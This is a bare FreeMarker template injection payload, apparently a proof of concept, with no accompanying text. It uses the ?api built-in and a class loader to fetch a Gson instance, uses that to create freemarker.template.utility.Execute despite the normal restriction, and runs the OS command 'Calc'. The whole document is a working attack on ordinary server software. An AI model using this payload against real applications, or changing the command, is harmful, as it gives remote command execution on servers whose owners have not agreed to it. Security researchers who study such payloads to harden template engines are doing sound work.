<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("ClassExposingGSON")>
<#assign field=clazz?api.getField("GSON")>
<#assign gson=field?api.get(null)>
<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))>
${ex("Calc")}